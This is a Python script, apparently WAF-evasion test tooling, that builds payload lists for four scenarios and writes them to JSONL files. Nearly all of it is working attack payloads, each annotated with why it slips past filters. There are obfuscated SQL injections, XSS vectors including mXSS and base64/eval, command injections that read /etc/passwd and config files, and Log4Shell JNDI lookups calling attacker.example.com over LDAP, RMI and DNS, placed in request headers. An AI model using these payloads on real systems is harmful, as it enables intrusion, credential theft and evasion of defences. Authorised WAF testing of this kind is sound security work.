"""M7 生成战役种子探针 — 为各场景生成带机制+理由的 AI 探针。

输出到 .campaign/<scenario>_probes.jsonl，供 run_round.py 消费。
每行字段符合 AI 门禁：payload / scenario / mechanism.primitives / generation.reason(≥20字)。
"""
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib import util  # noqa: E402

OUT = Path(__file__).resolve().parent.parent / ".campaign"
OUT.mkdir(exist_ok=True)

# 原语 id 第二段 → 规范 layer（xss/log4j2/upload 用子类目，需映射到 5 个规范层）
LAYER_MAP = {
    "context": "syntactic", "mutation": "syntactic", "obfuscation": "lexical",
    "lookup": "syntactic", "delivery": "syntactic",
    "extension": "lexical", "config": "semantic",
    "content": "semantic", "filename": "lexical", "transfer": "protocol",
}


def P(payload, scenario, prim, reason, summary="", placement=None):
    layer = LAYER_MAP.get(prim.split(":")[1], prim.split(":")[1])
    rec = {
        "payload": payload, "scenario": scenario, "category": "semantic_bypass",
        "mechanism": {"layers": [layer], "primitives": [{"id": prim}],
                      "encodings": [], "summary": summary or prim},
        "generation": {"source": "ai", "reason": reason},
    }
    if placement:
        rec["context"] = {"placements": [placement]}
    return rec


SQLI_R2 = [
    P("1 UN'I''ON' SE'L''ECT' 1,2,3", "sqli", "sqli:lexical:quote_split",
      "WAF 正则匹配连续 UNION/SELECT；MySQL 相邻字符串字面量自动拼接，UN'I''ON' 解析为 UNION，多引号加深打断"),
    P("1 UNION ALL%a0SELECT 1,2,3", "sqli", "sqli:lexical:whitespace_sub",
      "0xA0 被 MySQL 当分隔符但常不在 WAF 空格正则中，UNION 与 SELECT 之间插入 %a0 打断关键字对匹配"),
    P("1 UNION(SELECT 1,2,3)", "sqli", "sqli:syntactic:query_restructure",
      "UNION 后直接跟括号子查询，无空格；函数调用形态规避'UNION SELECT'连续特征"),
    P("1 UNION SELECT char(0x4e554c4c),1,1", "sqli", "sqli:syntactic:null_replacement",
      "NULL 关键字易触发规则；char(0x4e554c4c) 十六进制字面量等价 NULL 且无关键字"),
    P("1 AND GTID_SUBTRACT(USER(),1)--+", "sqli", "sqli:semantic:gtid_subset",
      "冷门报错函数 GTID_SUBTRACT 在报错信息带出数据，WAF 对冷门函数覆盖不全"),
    P("1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--+", "sqli", "sqli:semantic:gtid_subset",
      "EXTRACTVALUE 报错注入，CONCAT 拼接 0x7e 与子查询结果，报错回显数据"),
    P("1 UN'ION' %a0 SE'LECT' 1,2,3", "sqli", "sqli:lexical:quote_split",
      "引号拆分与 %a0 空白替换叠加，两层词法混淆同时打断关键字连续匹配"),
    P("1 /*!50000UN'ION'*/ SEL/*ECT*/ 1,2,3", "sqli", "sqli:lexical:version_comment",
      "MySQL 版本注释与引号/注释拆分叠加：WAF 剥一层后仍看到非连续关键字，MySQL 解析为 UNION SELECT"),
    P("1 UNION SELECT 1,2,3 ORDER BY 1", "sqli", "sqli:syntactic:query_restructure",
      "UNION 后加 ORDER BY 稀释语义特征，WAF 对完整 UNION 注入链路识别力下降"),
    P("1 AND (SELECT 1 FROM (SELECT SLEEP(0))a)--+", "sqli", "sqli:semantic:math_zero",
      "SLEEP(0) 放入子查询，时间盲注语法，避开 SLEEP(数字) 的直白特征"),
    P("1 UNION%0bSELECT 1,2,3", "sqli", "sqli:lexical:whitespace_sub",
      "垂直制表符 %0b 作 MySQL 分隔符，WAF 空格类正则常不含 %0b"),
    P("1 GROUP BY 1 HAVING 1=1--+", "sqli", "sqli:syntactic:query_restructure",
      "HAVING 子句注入，绕过只盯 WHERE 后的注入检测，语义等价布尔判断"),
]

XSS_R1 = [
    P("<svg/onload=alert(1)>", "xss", "xss:context:tag_bypass",
      "SVG 标签自带 onload 事件且省略引号，WAF 对 <script 标签黑名单，svg 标签不在其中"),
    P("<details open ontoggle=alert(1)>", "xss", "xss:context:tag_bypass",
      "details 标签 open 属性触发 ontoggle 事件，冷门标签+冷门事件处理器"),
    P("<input autofocus onfocus=alert(1)>", "xss", "xss:context:attr_event",
      "input 标签 autofocus 触发 onfocus，属性事件无需闭合标签即可执行"),
    P("'><img src=x onerror=alert(1)>", "xss", "xss:context:attr_event",
      "闭合引号后注入 img 标签事件，属性上下文逃逸"),
    P("<img src=x onerror=top['al'+'ert'](1)>", "xss", "xss:obfuscation:js_func_obfuscation",
      "alert 关键字用数组下标拼接 'al'+'ert' 规避，WAF 匹配不到 alert("),
    P("<script>Function('alert(1)')()</script>", "xss", "xss:obfuscation:js_func_obfuscation",
      "Function 构造器动态执行 alert，绕 eval/alert 关键字黑名单"),
    P("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "xss", "xss:obfuscation:js_func_obfuscation",
      "base64 解码后 eval，payload 中无 alert( 明文，WAF 无法匹配关键字"),
    P("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "xss", "xss:mutation:mxss_noscript",
      "mXSS 浏览器重解析使无害的 noscript/p 标签结构错位，渲染后触发 img 事件"),
    P("<svg><foreignObject><p><iframe src=javascript:alert(1)></iframe></p></foreignObject></svg>", "xss", "xss:mutation:mxss_svg",
      "SVG+foreignObject 重解析执行 javascript: 协议，初始结构对 WAF 无害"),
    P("<img src=x onerror=confirm(1)>", "xss", "xss:context:attr_event",
      "用 confirm 替代 alert 规避 alert 单函数黑名单，同属弹窗证明 XSS"),
    P("javascript:alert(1)", "xss", "xss:context:url_proto",
      "URL 上下文 javascript: 伪协议，直接作为 href/src 值注入"),
    P("<iframe srcdoc='<script>alert(1)</script>'>", "xss", "xss:context:tag_bypass",
      "iframe srcdoc 内嵌完整 HTML 文档，外层无 <script 特征"),
    # ── 内容层补充（检索后新增）──
    P("<svg><a xlink:href=\"javascript:alert(1)\">x</a></svg>", "xss", "xss:context:svg_xlink",
      "SVG a 标签 xlink:href 触发 javascript: 协议，svg 标签不在常见 XSS 黑名单"),
    P("<math><mtext><a href=\"javascript:alert(1)\">x</a></mtext></math>", "xss", "xss:context:math_mtext",
      "MathML mtext 标签容错解析内嵌 HTML，冷门标签绕过 <script 特征"),
    P("<img src=x onpointerenter=alert(1)>", "xss", "xss:context:event_more",
      "onpointerenter 冷门事件处理器，WAF 常见事件黑名单常不含它"),
    P("<img src=x onauxclick=alert(1)>", "xss", "xss:context:event_more",
      "onauxclick 冷门鼠标事件，绕 onerror/onload 黑名单"),
    P("<body onscroll=alert(1)>", "xss", "xss:context:event_more",
      "body 标签 onscroll 滚动事件，事件与标签组合不在常见规则"),
    P("<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "xss", "xss:obfuscation:from_charcode",
      "String.fromCharCode 逐字符构造 alert(1)，payload 无 alert( 明文"),
    P("<svg><a xlink:href=\"javascript:top['al'+'ert'](1)\">", "xss", "xss:obfuscation:js_func_obfuscation",
      "xlink:href + 数组下标拼接 alert，双重绕过"),
    P("<img src=x onmouseover=confirm(1)>", "xss", "xss:context:event_more",
      "confirm 替代 alert + onmouseover，双冷门组合"),
    P("<svg onload=alert(String.fromCharCode(49))>", "xss", "xss:obfuscation:from_charcode",
      "svg onload + String.fromCharCode，最小化攻击特征"),
]

CMDI_R1 = [
    P(";c'a't /etc/passwd", "cmdi", "cmdi:lexical:quote_split",
      "shell 引号移除使 c'a't 解析为 cat，WAF 的 cat 连续字符串匹配被打断"),
    P(";c\\a\\t /etc/passwd", "cmdi", "cmdi:lexical:backslash",
      "反斜杠转义使 c\\a\\t 解析为 cat，绕命令名字符串黑名单"),
    P(";cat${IFS}/etc/passwd", "cmdi", "cmdi:lexical:ifs",
      "${IFS} 作为 shell 空白替代空格，'cat 路径'特征不连续"),
    P(";$'\\x63\\x61\\x74' /etc/passwd", "cmdi", "cmdi:lexical:ansi_c_quoting",
      "ANSI-C 引号十六进制转义生成 cat，payload 无 cat 明文"),
    P(";{cat,/etc/passwd}", "cmdi", "cmdi:syntactic:brace_expansion",
      "花括号展开 {cat,/etc/passwd} 为两个词，命令与参数整体打包"),
    P(";/???/passwd", "cmdi", "cmdi:syntactic:glob",
      "glob 通配符匹配 /bin/cat 类命令，WAF 按字面匹配命令名失手"),
    P(":;true && cat /etc/passwd", "cmdi", "cmdi:syntactic:logical_chain",
      "无害命令稀释 token 序列，WAF 对完整命令链的匹配力下降"),
    P(";cat /etc//passwd", "cmdi", "cmdi:syntactic:glob",
      "双斜杠路径归一化，绕路径精确匹配规则"),
    P(";cat /etc/./passwd", "cmdi", "cmdi:syntactic:glob",
      "./ 路径归一化，WAF 归一化与 shell 不一致时失配"),
    P(";cd /etc && cat passwd", "cmdi", "cmdi:syntactic:logical_chain",
      "分步读取：cd 进目录再 cat 文件名，避免单条 /etc/passwd 完整路径特征"),
    P(";whoami;id;uname -a", "cmdi", "cmdi:semantic:env_concat",
      "多命令枚举系统信息，命令本身无害组合后泄露环境"),
    P(";cat /srv/app/config/database.cnf", "cmdi", "cmdi:syntactic:logical_chain",
      "直接读取配置敏感文件，测试 WAF 对文件路径黑名单的覆盖"),
]

LOG4J_R1 = [
    P("${jndi:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:lower_upper",
      "基线 JNDI payload，测试 WAF 是否拦截 jndi/ldap 关键字"),
    P("${${lower:j}ndi:${lower:l}dap://attacker.example.com/z}", "log4j2", "log4j2:lookup:lower_upper",
      "lower lookup 运行时重构 jndi/ldap 关键字，WAF 连续匹配被打断"),
    P("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.example.com/z}", "log4j2", "log4j2:lookup:empty_default",
      "空串默认值逐字符拼出 jndi:ldap://，payload 无 jndi 明文"),
    P("${jnd${env:EMPTY:-i}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:env_default",
      "环境变量默认值中间插入关键字，${jndi} 不连续"),
    P("${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:date_lookup",
      "日期格式指令产出关键字字符，WAF 匹配不到 jndi 文本"),
    P("${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:non_exist_lookup",
      "非存在 lookup 取默认值拼关键字，冷门混淆 WAF 规则未覆盖"),
    P("${jndi:ldap://127.0.0.1#attacker.example.com/z}", "log4j2", "log4j2:lookup:hash_fragment",
      "URI 片段 # 绕过主机名校验，LDAP 解析器连全主机名"),
    P("${jndi:ldap://[127.0.0.1]:1389/a}", "log4j2", "log4j2:lookup:ip_bracket",
      "方括号 IP 字面量，规避 ip:port 常规形态检测"),
    # ── 内容层补充（检索后新增）──
    P("${jnd${upper:ı}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:dotless_i",
      "无点小写 ı 经 upper 归一化成 I，jndı→jndi，WAF 正则只匹配 jndi 字面量则失手"),
    P("${jnd${sys:SYS_NAME:-i}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:sys_default",
      "系统属性默认值 ${sys:SYS_NAME:-i} 产出 i，链式拼出 jndi，绕 env 类规则"),
    P("${jndi:rmi://attacker.example.com/z}", "log4j2", "log4j2:lookup:exotic_protocol",
      "RMI 协议替代 LDAP，WAF 黑名单常只覆盖 ldap"),
    P("${jndi:dns://attacker.example.com}", "log4j2", "log4j2:lookup:exotic_protocol",
      "DNS 协议变体，WAF 对 dns:// 覆盖弱"),
    P("${java:version}${env:OS}", "log4j2", "log4j2:lookup:info_disclosure",
      "非 JNDI lookup 直接泄露 java 版本/环境变量，WAF 对非 jndi 前缀覆盖弱"),
    P("${bundle:application:spring.datasource.password}", "log4j2", "log4j2:lookup:info_disclosure",
      "ResourceBundle lookup 读数据库密码，冷门信息泄露路径"),
    P("${${lower:${upper:jn}}di:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:deep_nesting",
      "三层嵌套递归，WAF 单层匹配在多层级下失手"),
    P("${jnd${upper:ı}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:dotless_i",
      "无点 ı 混淆放置 UA 头，双维度测试", placement="ua"),
    P("${${lower:j}ndi:${lower:l}dap://attacker.example.com/z}", "log4j2", "log4j2:delivery:header_injection",
      "lower 混淆放置 Referer 头，Log4j2 标准攻击面", placement="referer"),
    P("${jnd${sys:LDAP:-i}:ldap://attacker.example.com/z}", "log4j2", "log4j2:lookup:sys_default",
      "sys 默认值链拼关键字放置 X-Forwarded-For", placement="xff"),
    P("${jndi:ldap://attacker.example.com/z}", "log4j2", "log4j2:delivery:header_injection",
      "基线 JNDI payload 放置 UA 头，测 WAF 对 UA 头 jndi 检测", placement="ua"),
    P("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.example.com/z}", "log4j2", "log4j2:lookup:empty_default",
      "空串默认值逐字符拼 jndi:ldap，放置 Referer 头测试", placement="referer"),
]

SCENARIOS = {"sqli": SQLI_R2, "xss": XSS_R1, "cmdi": CMDI_R1, "log4j2": LOG4J_R1}


def main():
    for scen, probes in SCENARIOS.items():
        out = OUT / ("%s_probes.jsonl" % scen)
        util.write_jsonl(str(out), probes)
        print("wrote %d probes -> %s" % (len(probes), out))


if __name__ == "__main__":
    main()
